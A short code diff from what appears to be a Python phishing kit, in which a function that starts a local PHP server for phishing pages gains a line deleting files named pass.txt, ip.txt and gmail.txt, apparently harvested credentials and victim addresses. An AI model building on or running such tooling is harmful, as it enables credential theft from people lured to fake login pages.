@@ -274,6 +274,7 @@ def phish(template):
 def startServicea(folder,port):
 	import os
 	os.chdir(folder)
+	os.system("rm pass.txt ip.txt gmail.txt > /dev/null 2&>1")
 	
 
 	code = f"""php -S 127.0.0.1:{port}> /dev/null 2>&1 &"""
